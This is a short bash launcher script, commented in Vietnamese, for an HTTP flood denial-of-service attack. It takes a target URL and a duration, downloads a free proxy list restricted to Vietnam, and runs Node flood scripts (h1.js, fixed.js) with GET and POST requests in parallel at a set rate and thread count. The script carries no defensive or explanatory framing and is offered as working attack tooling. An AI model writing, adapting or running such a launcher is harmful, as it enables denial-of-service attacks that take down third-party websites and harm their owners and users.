#!/bin/bash

[ $# -lt 2 ] && echo "Usage: $0 URL TIME" && exit 1

URL="$1"
TIME="$2"
THREADS=10
RATE=999
PFILE="hihi.txt"

# Tải proxy 1 lần tránh curl delay 
curl -s 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=9999' | sort -u > live.txt

# Chạy attack với 1 phương thức
attack_method() {
  METHOD=$1
  node h1.js "$METHOD" "$URL" live.txt "$TIME" "$RATE" "$THREADS" randomstring=true & PID1=$!
  node fixed.js "$URL" "$TIME" 48 1 kaka.txt --verify true & PID3=$!
  #node hmix.js -m "$METHOD" -u "$URL" -s "$TIME" -p "$PFILE" -t "$THREADS" -r "$RATE" --full true -d false & PID2=$!
  sleep "$TIME"; kill -9 $PID1 $PID2 $PID3 2>/dev/null
}

# Chạy GET và POST song song
attack_method GET &
attack_method POST &
